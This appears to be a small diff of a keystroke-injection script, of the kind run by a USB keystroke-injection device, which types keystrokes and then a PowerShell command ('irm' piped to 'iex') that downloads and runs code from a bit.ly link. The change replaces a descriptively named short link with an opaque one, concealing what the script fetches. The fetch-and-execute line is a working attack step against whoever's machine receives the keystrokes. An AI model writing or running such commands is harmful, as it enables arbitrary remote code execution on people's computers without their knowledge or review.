@@ -39,5 +39,5 @@ TAB
 TAB
 ENTER
 DELAY 2000
-STRING irm bit.ly/CloseAllApplicationsScript | iex
+STRING irm bit.ly/46cGbef | iex
 ENTER
